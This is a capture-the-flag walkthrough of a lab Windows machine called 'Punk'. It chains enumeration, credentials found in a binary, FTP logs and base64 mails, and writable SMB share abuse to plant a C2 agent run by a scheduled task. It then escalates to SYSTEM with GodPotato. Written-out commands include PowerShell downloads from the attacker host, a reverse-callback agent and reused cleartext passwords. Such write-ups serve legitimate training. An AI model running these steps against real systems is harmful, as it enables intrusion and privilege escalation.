---
description: >-
  Punk is a Windows machine that focuses on credential chaining through service
  log analysis, mail enumeration, and SMB share abuse to deliver a C2 payload
  via a scheduled task.
cover: ../.gitbook/assets/punk.jpeg
coverY: 0
---

# Punk(Windows)

## Initial Enumeration :&#x20;

### NMAP:

```
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
25/tcp    open  smtp          syn-ack ttl 127 MailEnable smptd 10.53--
| smtp-commands: arakusa.corp [10.8.0.19], this server offers 4 extensions, AUTH LOGIN, SIZE 40960000, HELP, AUTH=LOGIN
|_ 211 Help:->Supported Commands: HELO,EHLO,QUIT,HELP,RCPT,MAIL,DATA,RSET,NOOP
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
110/tcp   open  pop3          syn-ack ttl 127 MailEnable POP3 Server
|_pop3-capabilities: TOP UIDL USER
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
143/tcp   open  imap          syn-ack ttl 127 MailEnable imapd
|_imap-capabilities: IDLE AUTH=LOGIN UIDPLUS SPECIAL-USEA0001 CAPABILITY XLIST AUTH=CRAM-MD5 CHILDREN IMAP4rev1 OK completed IMAP4
445/tcp   open  microsoft-ds? syn-ack ttl 127
587/tcp   open  smtp          syn-ack ttl 127 MailEnable smptd 10.53--
| smtp-commands: arakusa.corp [10.8.0.19], this server offers 4 extensions, AUTH LOGIN, SIZE 40960000, HELP, AUTH=LOGIN
|_ 211 Help:->Supported Commands: HELO,EHLO,QUIT,HELP,RCPT,MAIL,DATA,RSET,NOOP
5040/tcp  open  unknown       syn-ack ttl 127
7680/tcp  open  pando-pub?    syn-ack ttl 127
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

### Web Server (port 80) :

* We see that port 80 is open so we go ahead and check the web server

<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

* This was a default IIS Web Server which wasn’t  very Interesting

#### dirsearch :

```
┌──(kali㉿kali)-[~/Desktop/ronin66/punk]
└─$ dirb http://172.16.18.15/        

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Aug 14 11:58:11 2026
URL_BASE: http://172.16.18.15/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.16.18.15/ ----
==> DIRECTORY: http://172.16.18.15/aspnet_client/  
```

* We didn’t find any interesting directories so we stop here and look forward on the web server.

### SMB(135,139,445):

* Since SMB ports are open, we see if we can anonymously access the share

```
──(kali㉿kali)-[~/Desktop/ronin66/punk]
└─$ nxc smb 172.16.18.15 -u '' -p ''                               
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-CLM9MNF) (domain:DESKTOP-CLM9MNF) (signing:True) (SMBv1:None)
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [-] DESKTOP-CLM9MNF\: STATUS_ACCESS_DENIED 
```

* We get an Access Denied so next we try with `Guest` User

```
┌──(kali㉿kali)-[~/Desktop/ronin66/punk]
└─$ nxc smb 172.16.18.15 -u 'Guest' -p ''
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-CLM9MNF) (domain:DESKTOP-CLM9MNF) (signing:True) (SMBv1:None)
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [+] DESKTOP-CLM9MNF\Guest: 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/ronin66/punk]
└─$ nxc smb 172.16.18.15 -u 'Guest' -p '' --shares
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-CLM9MNF) (domain:DESKTOP-CLM9MNF) (signing:True) (SMBv1:None)
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [+] DESKTOP-CLM9MNF\Guest: 
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [*] Enumerated shares
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  Share           Permissions     Remark
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  -----           -----------     ------
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  ADMIN$                          Remote Admin
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  C$                              Default share
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  dev             READ            
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  IPC$            READ            Remote IPC
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  prod                            
```

* We do see that as a `Guest` user we have access to the `dev` share as the `guest` user so we connect to it.

```
┌──(kali㉿kali)-[~/Desktop/ronin66/punk]
└─$ smbclient '//172.16.18.15/dev' -U 'Guest'
Password for [WORKGROUP\Guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Oct  1 05:08:56 2025
  ..                                DHS        0  Fri Aug 14 10:12:34 2026
  OldCyber2077.dll                    A     7168  Wed Oct  1 05:07:45 2025
  OldCyber2077.exe                    A 63606204  Wed Oct  1 05:07:46 2025
  procmon.exe                         A  4124696  Wed Oct  1 05:08:30 2025

                16559871 blocks of size 4096. 10379072 blocks available
```

* We found some interesting files so we download them locally and analyze it using a popular tool named `dnsspy` which is used as  `.NET` based editor

{% embed url="https://github.com/dnspy/dnspy" %}

* After analyzing for a while we found some creds for the `FTP` as earlier during port scan we saw that FTP port was open

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

### FTP (21):

* Since now we had the FTP creds, we connect to it

```
┌──(kali㉿kali)-[~/Desktop/ronin66/punk]
└─$ ftp 172.16.18.15
Connected to 172.16.18.15.
220 Microsoft FTP Service
Name (172.16.18.15:kali): nightftp
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||50821|)
125 Data connection already open; Transfer starting.
10-01-25  12:16PM       <DIR>          aspnet_client
10-01-25  09:50AM                  353 info.txt
10-01-25  10:11AM                  977 logs_data_2025-10-01_12-00-00.txt
10-01-25  10:17AM                  919 logs_data_2025-10-01_12-00-01.txt
10-01-25  10:12AM                  772 logs_data_2025-10-01_12-00-02.txt
10-01-25  10:13AM                  755 logs_data_2025-10-01_12-00-03.txt
10-01-25  10:14AM                  768 logs_data_2025-10-01_12-00-04.txt
10-01-25  09:47AM                17280 OIP.jpg
```

* Here we found some log files and `info.txt` so we downloaded them locally.

```
ftp> mget *
mget info.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||50827|)
125 Data connection already open; Transfer starting.
100% |**********************************************************************************************************************************************************************************************|   353        1.53 KiB/s    00:00 ETA
226 Transfer complete.
353 bytes received in 00:00 (1.52 KiB/s)
mget logs_data_2025-10-01_12-00-00.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||50828|)
125 Data connection already open; Transfer starting.
100% |**********************************************************************************************************************************************************************************************|   977        4.15 KiB/s    00:00 ETA
226 Transfer complete.
977 bytes received in 00:00 (4.15 KiB/s)
mget logs_data_2025-10-01_12-00-01.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||50829|)
125 Data connection already open; Transfer starting.
100% |**********************************************************************************************************************************************************************************************|   919        3.90 KiB/s    00:00 ETA
226 Transfer complete.
919 bytes received in 00:00 (3.82 KiB/s)
mget logs_data_2025-10-01_12-00-02.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||50830|)
125 Data connection already open; Transfer starting.
100% |**********************************************************************************************************************************************************************************************|   772        3.28 KiB/s    00:00 ETA
226 Transfer complete.
772 bytes received in 00:00 (3.20 KiB/s)
mget logs_data_2025-10-01_12-00-03.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||50831|)
125 Data connection already open; Transfer starting.
100% |**********************************************************************************************************************************************************************************************|   755        3.34 KiB/s    00:00 ETA
226 Transfer complete.
755 bytes received in 00:00 (3.26 KiB/s)
mget logs_data_2025-10-01_12-00-04.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||50832|)
125 Data connection already open; Transfer starting.
100% |**********************************************************************************************************************************************************************************************|   768        3.27 KiB/s    00:00 ETA
226 Transfer complete.
768 bytes received in 00:00 (3.26 KiB/s)
mget OIP.jpg [anpqy?]? y
229 Entering Extended Passive Mode (|||50833|)
125 Data connection already open; Transfer starting.
100% |**********************************************************************************************************************************************************************************************| 17280       35.16 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 56 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
17280 bytes received in 00:00 (35.12 KiB/s)
ftp> exit
221 Goodbye.

```

* Now while analyzing, In the log file we found some interesting information which was the credentials which could possibly be used.

```
┌──(kali㉿kali)-[~/Desktop/ronin66/punk]
└─$ cat logs_data_2025-10-01_12-00-01.txt
# SNMP dump
# Target: 10.10.87.22
# Auth: user=snmp-user-admin pass=dsabih231D22d@@lk77
# Generated: 2025-10-01 12:00:01
 
1.3.6.1.2.1.1.1.0 = Embedded OS v3.2.1
1.3.6.1.2.1.1.3.0 = 2345678
1.3.6.1.2.1.2.2.1.10.1 = 112233
1.3.6.1.2.1.2.2.1.16.1 = 332211
1.3.6.1.4.1.2021.4.5.0 = 4096
systemLoad1 = 0.05
systemLoad5 = 0.03
uptimeSeconds = 234567
activeProcesses = 87
interfaceCount = 2
ifInErrors.1 = 0
ifOutErrors.1 = 1
diskTotal = 65536
diskFree = 56000
temperature = 45
 
SNMP simulated dump.
Note: Authentication attempted with mock credentials.
Local file: logs/snmp/logs_data_2025-10-01_12-00-01.txt
Contained artifact: smtp credentials found in config payload:
info@arakusa.corp
Imp0ssibl3tol3akth!son3
FTP marker: Uploaded by nightftp:Silverhand2077# at 2025-10-01 12:00:01
FTP stored as: ftp_upload/uploaded_2025-10-01_12-00-01.txt
END OF DUMP
-- log end --
Generated by Cyber2077 
```

* Firstly, We found some creds in `#author` tag as `snmp-user-admin:dsabih231D22d@@lk77` , we then tried these creds to authenticate

```
┌──(kali㉿kali)-[~/Desktop/ronin66/punk]
└─$ nxc smb 172.16.18.15 -u 'snmp-user-admin' -p 'dsabih231D22d@@lk77'
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-CLM9MNF) (domain:DESKTOP-CLM9MNF) (signing:True) (SMBv1:None)
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [+] DESKTOP-CLM9MNF\snmp-user-admin:dsabih231D22d@@lk77 (Guest)
```

* These creds didn't seemed to be valid then we again had a look at the log file to see if we are missing something
* Then, we found an interesting information which was a mail and a password which was `info@arakusa.corp` and `Imp0ssibl3tol3akth!son3` and we alread saw in the port scan that `POP3` port was open so this seemed to be the way

### POP3(port 110) :

* So now we try to verify the mail ID and Password first using `swaks` tool which is an SMTP command-line tool.

```
┌──(kali㉿kali)-[~/Desktop/ronin66/punk]
└─$ swaks --to info@arakusa.corp --from info@arakusa.corp --server 172.16.18.15 --auth LOGIN --auth-user info@arakusa.corp --auth-password 'Imp0ssibl3tol3akth!son3'
=== Trying 172.16.18.15:25...
=== Connected to 172.16.18.15.
<-  220 DESKTOP-CLM9MNF.arakusa.corp ESMTP MailEnable Service, Version: 10.53-- ready at 08/15/26 13:21:30
 -> EHLO kali
<-  250-arakusa.corp [10.8.0.19], this server offers 4 extensions
<-  250-AUTH LOGIN
<-  250-SIZE 40960000
<-  250-HELP
<-  250 AUTH=LOGIN
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> aW5mb0BhcmFrdXNhLmNvcnA=
<-  334 UGFzc3dvcmQ6
 -> SW1wMHNzaWJsM3RvbDNha3RoIXNvbjM=
<-  235 Authenticated
 -> MAIL FROM:<info@arakusa.corp>
<-  250 Requested mail action okay, completed
 -> RCPT TO:<info@arakusa.corp>
<-  250 Requested mail action okay, completed
 -> DATA
<-  354 Start mail input; end with <CRLF>.<CRLF>
 -> Date: Sat, 15 Aug 2026 09:21:33 -0400
 -> To: info@arakusa.corp
 -> From: info@arakusa.corp
 -> Subject: test Sat, 15 Aug 2026 09:21:33 -0400
 -> Message-Id: <20260815092133.038890@kali>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> 
 -> This is a test mailing
 -> 
 -> 
 -> .
<-  250 Requested mail action okay, completed
 -> QUIT
<-  221 Service closing transmission channel
=== Connection closed with remote host.
```

* We saw these were valid mail credentials that is why we were able to send a test mail and got `235 Authenticated` .
* Now we list out the mails using `curl` on the POP3 service.

```
┌──(kali㉿kali)-[~/Desktop/ronin66/punk]
└─$ curl -k pop3://172.16.18.15 --user 'info@arakusa.corp:Imp0ssibl3tol3akth!son3' --list-only
1 5149
2 1407
3 2016
4 407
```

* We saw that there were 4 mails present out of which the 1st one which had a bigger size
* We now read the first mail using the same `curl`

```
--┌──(kali㉿kali)-[~/Desktop/ronin66/punk]
└─$ curl -k pop3://172.16.18.15/1 --user 'info@arakusa.corp:Imp0ssibl3tol3akth!son3'            
Message-ID: <006301c1c8c6$d086f5b0$0100a8c0@mailenable.com>
From: "MailEnable Administrator" <Postmaster>
To: "Mail User" <User@mailenable.com>
Subject: New E-Mail Account Notification
MIME-Version: 1.0
Content-Type: multipart/related;
        type="multipart/alternative";
        boundary="----=_NextPart_000_005F_01C1C923.03EB38B0"
X-Priority: 3
X-MSMail-Priority: Normal
X-Mailer: MailEnable Server 1.00.000.0000
X-MimeOLE: Produced By MailEnable MimeOLE V1.0.0.0
Date: Wed, 1 Oct 2025 12:29:34 +0200

This is a multi-part message in MIME format.

------=_NextPart_000_005F_01C1C923.03EB38B0
Content-Type: multipart/alternative;
        boundary="----=_NextPart_001_0060_01C1C923.03EB38B0"


------=_NextPart_001_0060_01C1C923.03EB38B0
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

Your new e-mail account has been activated and is ready =
for use.=20


-------------------------------------------------------------------------=
-------

If you have problems accessing mail, please contact your system =
administrator or the administrator of your e-mail service.


------=_NextPart_001_0060_01C1C923.03EB38B0
Content-Type: text/html;
        charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD>
<META http-equiv=3DContent-Type content=3D"text/html; =
charset=3Diso-8859-1">
<META content=3D"MSHTML 5.50.4913.1100" name=3DGENERATOR>
<STYLE></STYLE>
</HEAD>
<BODY bgColor=3D#ffffff>
<DIV><FONT face=3DArial size=3D2>
<DIV><FONT face=3DArial size=3D2>
<DIV><FONT face=3DArial size=3D2><STRONG>Your new e-mail account=20
has been activated and is ready for use. </STRONG></FONT></DIV>
<DIV>&nbsp;</DIV>
<DIV>
<HR>
</DIV>
<DIV><STRONG></STRONG>
<DIV><FONT face=3DArial size=3D2><EM>If you have problems accessing =
mail, please=20
contact your system administrator or the administrator of your =
e-mail service.</FONT></DIV>
<DIV><EM></EM>&nbsp;</DIV></FONT><FONT face=3DArial=20
size=3D2><STRONG></STRONG><STRONG></STRONG></FONT></DIV></DIV>
<DIV><FONT face=3DArial size=3D2>
<DIV><FONT face=3DArial size=3D2><IMG =
src=3D"cid:005e01c1c8c6$d0793a10$0100a8c0@mailenable.com"=20
width=3D100></FONT></DIV></FONT></DIV></FONT></DIV></BODY></HTML>
------------------snip--------------------------------------
```

* The first email didn't provide much info so we moved on the next ones and created a small bash script to read the mails

```
┌──(kali㉿kali)-[~/Desktop/ronin66/punk]
└─$ for i in 2 3 4; do                                                              
  echo "========== MESSAGE $i =========="
  curl -k pop3://172.16.18.15/$i --user 'info@arakusa.corp:Imp0ssibl3tol3akth!son3'
  echo ""
done
========== MESSAGE 2 ==========
Received: from DESKTOP-CLM9MNF ([::1]) by arakusa.corp with
 MailEnable ESMTPA; Wed, 1 Oct 2025 13:07:26 +0200
MIME-Version: 1.0
From: "Eric" <info@arakusa.corp>
To: "All Staff" <info@arakusa.corp>
Date: 1 Oct 2025 13:07:26 +0200
Subject: URGENTE: change default passwords
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: base64
Message-ID: <06D9CC3FF1794FEFB54F309E3137FEA3.MAI@arakusa.corp>
Return-Path: <info@arakusa.corp>

VGVhbSwNCiANClRoZXJlIGhhcyBiZWVuIGEgcHVibGljIGxlYWsgdGhpcyB5ZWFyIHRo
YXQgYWZmZWN0cyBkZWZhdWx0IGNyZWRlbnRpYWxzIG9uIG11bHRpcGxlIHZlbmRvciBk
ZXZpY2VzIGFuZCBzZXJ2aWNlcy4gRWZmZWN0aXZlIGltbWVkaWF0ZWx5LCAqKmV2ZXJ5
b25lIG11c3QgY2hhbmdlIGFueSBkZWZhdWx0IHBhc3N3b3JkcyoqIG9uIHRoZSBzeXN0
ZW1zIGFuZCBhcHBsaWFuY2VzIHlvdSBtYW5hZ2UuDQogDQpJbiBwYXJ0aWN1bGFyLCBw
bGVhc2UgcmVwbGFjZSBhbnkgdXNlIG9mIHRoZSBkZWZhdWx0IHBhc3N3b3JkICoqQXJh
a3VzYTIwMjUqKiB3aXRoIGEgdW5pcXVlLCBzdHJvbmcgcGFzc3dvcmQgYW5kIGRvY3Vt
ZW50IHRoZSBjaGFuZ2UgaW4gdGhlIHRpY2tldGluZyBzeXN0ZW0uIEZvY3VzIGZpcnN0
IG9uOg0KLSBOZXR3b3JrIGRldmljZXMgKHN3aXRjaGVzLCByb3V0ZXJzLCBmaXJld2Fs
bHMpDQotIEZpbGUgc2hhcmVzIGFuZCBiYWNrdXBzDQotIFNlcnZpY2UgYWNjb3VudHMg
ZXhwb3NlZCB0byB0aGUgbmV0d29yaw0KIA0KQ29uZmlybSBjb21wbGV0aW9uIGluIHRo
ZSAjaXQtb3BzIGNoYW5uZWwgb3IgcmVwbHkgdG8gdGhpcyBlbWFpbCBvbmNlIHlvdSBo
YXZlIGNvbXBsZXRlZCB0aGUgY2hhbmdlcyBmb3IgeW91ciBzY29wZS4NCiANClRoYW5r
cywNCkVyaWMNCkNUTw0KYXJha3VzYS5jb3Jw



========== MESSAGE 3 ==========
Received: from DESKTOP-CLM9MNF ([::1]) by arakusa.corp with
 MailEnable ESMTPA; Wed, 1 Oct 2025 13:07:27 +0200
MIME-Version: 1.0
From: "Alan" <info@arakusa.corp>
To: "IT Staff" <info@arakusa.corp>
Date: 1 Oct 2025 13:07:27 +0200
Subject: ACTION REQUIRED: cyber2077.exe / prod service
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: base64
Message-ID: <E870808A6D364A6EA006E385038F3B02.MAI@arakusa.corp>
Return-Path: <info@arakusa.corp>

SGkgdGVhbSwNCiANCkZvbGxvd2luZyByZWNlbnQgZmluZGluZ3MsIHBsZWFzZSB0YWtl
IHR3byBhY3Rpb25zIGltbWVkaWF0ZWx5IHJlZ2FyZGluZyB0aGUgY3liZXIyMDc3LmV4
ZSBhcnRpZmFjdDoNCiANCjEpIFJlbW92ZSAqKkN5YmVyMjA3Ny5leGUqKiBmcm9tIHRo
ZSAqKnByb2QqKiBzaGFyZS4gVGhlIGJpbmFyeSBtdXN0IGJlIGRlbGV0ZWQgZnJvbSB0
aGUgc2hhcmVkIGZvbGRlciB0byBwcmV2ZW50IGZ1cnRoZXIgZXhlY3V0aW9uLg0KIA0K
MikgKipEaXNhYmxlIHRoZSBzZXJ2aWNlIC8gc2NoZWR1bGVkIGpvYioqIHRoYXQgYXV0
b21hdGljYWxseSBzY2FucyB0aGUgcHJvZCBzaGFyZSBhbmQgZXhlY3V0ZXMgdGhhdCBi
aW5hcnkuIElmIHRoZSBzZXJ2aWNlIHJlbWFpbnMgYWN0aXZlIGFmdGVyIHRoZSBmaWxl
IGlzIGRlbGV0ZWQsIGl0IHdpbGwgY29udGludWUgdG8gcnVuIGEgbWlzc2luZy9lbXB0
eSB0YXNrIGFuZCBtYXkgcHJvZHVjZSBtaXNsZWFkaW5nIGxvZ3Mgb3IgcmVzdGFydCBh
dHRlbXB0czsgd2UgbXVzdCByZW1vdmUgdGhlIGV4ZWN1dGlvbiB0cmlnZ2VyIGFzIHdl
bGwuDQogDQpQcm9jZWR1cmU6DQotIFN0b3AgdGhlIHNlcnZpY2UvdGFzayBvbiB0aGUg
aG9zdCB0aGF0IHJ1bnMgdGhlIHByb2Qgc2hhcmUgam9iLg0KLSBWZXJpZnkgdGhlcmUg
YXJlIG5vIHN0YXJ0dXAgZW50cmllcyBvciBzY2hlZHVsZWQgdGFza3MgdGhhdCByZWZl
cmVuY2UgY3liZXIyMDc3LmV4ZS4NCi0gUmVtb3ZlIHRoZSBmaWxlIFxcPHNlcnZlcj5c
cHJvZFxjeWJlcjIwNzcuZXhlLg0KLSBDb25maXJtIHRoZSBzZXJ2aWNlIGlzIGRpc2Fi
bGVkIGFuZCBkb2N1bWVudCB0aGUgY2hhbmdlLg0KIA0KSWYgeW91IGNhbm5vdCByZWFj
aCB0aGUgaG9zdCBvciBuZWVkIGVsZXZhdGVkIHJpZ2h0cywgZXNjYWxhdGUgdG8gbWUg
aW1tZWRpYXRlbHkuIERvIG5vdCBzaW1wbHkgZGVsZXRlIHRoZSBmaWxlIHdpdGhvdXQg
ZGlzYWJsaW5nIHRoZSBleGVjdXRpb24gbWVjaGFuaXNtIMOi4oKs4oCdIHRoYXQgd2ls
bCBsZWF2ZSB0aGUgc3lzdGVtIGluIGEgbm9pc3ksIHVuc3RhYmxlIHN0YXRlLg0KIA0K
VGhhbmtzLA0KQWxhbg0KU2VuaW9yIFN5c3RlbXMgRW5naW5lZXINCmFyYWt1c2EuY29y
cA==



========== MESSAGE 4 ==========
Received: from kali ([10.8.0.19]) by arakusa.corp with
 MailEnable ESMTPA; Sat, 15 Aug 2026 13:21:31 +0200
Date: Sat, 15 Aug 2026 09:21:33 -0400
To: info@arakusa.corp
From: info@arakusa.corp
Subject: test Sat, 15 Aug 2026 09:21:33 -0400
Message-Id: <20260815092133.038890@kali>
X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
Return-Path: <info@arakusa.corp>

This is a test mailing
```

* Now as we could see that these mails were `base64` encoded so we go ahead and decoded them
* Upon Decoding the second mail we found a cleartext password

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

* Next we decoded the third mail as that could also provide us any important attack vector or piece of information.

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

* From this mail, We got to know that there is a scheduled service/task running that executes the file named `cyber2077.exe`
* Now we tried the password against the users that we retrieved from the mails.

```
┌──(kali㉿kali)-[~/Desktop/ronin66/punk]
└─$ nxc smb 172.16.18.15 -u 'eric' -p 'Arakusa2025' --smb-timeout 30                   
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-CLM9MNF) (domain:DESKTOP-CLM9MNF) (signing:True) (SMBv1:None)
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [-] DESKTOP-CLM9MNF\eric:Arakusa2025 STATUS_LOGON_FAILURE 
                                                                                                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/ronin66/punk]
└─$ nxc smb 172.16.18.15 -u 'alan' -p 'Arakusa2025' --smb-timeout 30            
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-CLM9MNF) (domain:DESKTOP-CLM9MNF) (signing:True) (SMBv1:None)
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [+] DESKTOP-CLM9MNF\alan:Arakusa2025
```

* Here, We found out that the password `Arakusa2025` was valid for the user `alan`&#x20;
* Now we list out the shares that this user has acces or any interesting permission

```
┌──(kali㉿kali)-[~/Desktop/ronin66/punk]
└─$ nxc smb 172.16.18.15 -u 'alan' -p 'Arakusa2025' --smb-timeout 30 --shares
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-CLM9MNF) (domain:DESKTOP-CLM9MNF) (signing:True) (SMBv1:None)
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [+] DESKTOP-CLM9MNF\alan:Arakusa2025 
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [*] Enumerated shares
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  Share           Permissions     Remark
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  -----           -----------     ------
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  ADMIN$                          Remote Admin
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  C$                              Default share
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  dev             READ            
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  IPC$            READ            Remote IPC
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  prod            READ,WRITE
```

* Here We found out that we had read,write access to the share named `prod` , this was the share where the file named `cyber2077.exe` was scheduled to get executed so we connect to it

```
┌──(kali㉿kali)-[~/Desktop/ronin66/punk]
└─$ smbclient '//172.16.18.15/prod' -U 'alan'
Password for [WORKGROUP\alan]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug 15 07:29:56 2026
  ..                                DHS        0  Sat Aug 15 07:00:27 2026

                16559871 blocks of size 4096. 10412037 blocks available
smb: \> exit
```

* We found out that this share was empty.
* Here an Attack path was clear, we could use our `Adaptix C2`  and put an executable with the same name `cyber2077.exe` which would get executed and give us a callback

## Shell as `svc_v` :&#x20;

* Now we started our `Adaptix C2`

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

*   We then created a listener on the port `8443`

    <figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
* We generated the agent and named it as `cyber2077.exe`&#x20;
* Next we upload the file using `smbclient` to the `prod` share

```
┌──(kali㉿kali)-[~/Desktop/ronin66/punk]
└─$ smbclient '//172.16.18.15/prod' -U 'alan'
Password for [WORKGROUP\alan]:
Try "help" to get a list of possible commands.
smb: \> put cyber2077.exe
putting file cyber2077.exe as \cyber2077.exe (379.3 kB/s) (average 379.3 kB/s)
```

* After a while, we see a callback on our `Adaptix C2` Server as the user `svc_v`

<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

* Now from the console, We go ahead and get the `user.flg` in the `C:\Users\Public\` directory

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

## Shell as `system` :&#x20;

* Now for privesc, we first checked our current user privileges using `whoami /all`&#x20;

<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

* Here we found out that `seImpersonatePrivilege` was enabled so we used the potato based attacks.
* We used the `Godpotato-NET4.exe`  for the privesc

{% embed url="https://github.com/BeichenDream/GodPotato" %}

* We then transferred this from our attacker machine to the machine IP using a Python web server

```
┌──(kali㉿kali)-[~/Desktop/ronin66/punk]
└─$ python3 -m http.server                          
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

* On the `Adaptix` console we used the `iwr` command

```
[15/08 13:06:17] server [fe04765e] beacon > powershell iwr http://10.8.0.19:8000/GodPotato-NET4.exe -Outfile C:\Users\Public\GodPotato-NET4.exe
[15/08 13:06:17] [*] Task: create new process
[15/08 13:06:22] [*] Agent called server, sent [172 bytes]
[15/08 13:06:22] [+] Program C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c iwr http://10.8.0.19:8000/GodPotato-NET4.exe -Outfile C:\Users\Public\GodPotato-NET4.exe started with PID 11188 (output - with output)
[15/08 13:06:26] [+] Job [fe04765e] output:
```

* Now since we were using `Adaptix C2` and wanted the shell there, we created another listener on port `4443`.

<figure><img src="../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

* Then we created an agent and named it as `rev.exe` and transferred it to the Machine using python web server

```
┌──(kali㉿kali)-[~/Desktop/ronin66/punk]
└─$ python3 -m http.server                          
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

* Then we used the same `iwr` command on the console in `Adaptix`

```
powershell iwr http://10.8.0.19:8000/rev.exe -Outfile C:\Users\Public\rev.exe
[15/08 13:12:17] [*] Task: create new process
[15/08 13:12:17] [*] Agent called server, sent [150 bytes]
[15/08 13:12:18] [+] Program C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c iwr http://10.8.0.19:8000/rev.exe -Outfile C:\Users\Public\rev.exe started with PID 9232 (output - with output)
[15/08 13:12:22] [+] Job [66eb151f] output:
```

* Now we had both the `Godpotato` and `rev.exe` now it was time for the execution

```
[15/08 13:16:33] server [821ffea0] beacon > powershell C:\Users\Public\GodPotato-NET4.exe -cmd "C:\users\Public\rev.exe"
[15/08 13:16:33] [*] Task: create new process
[15/08 13:16:34] [*] Agent called server, sent [147 bytes]
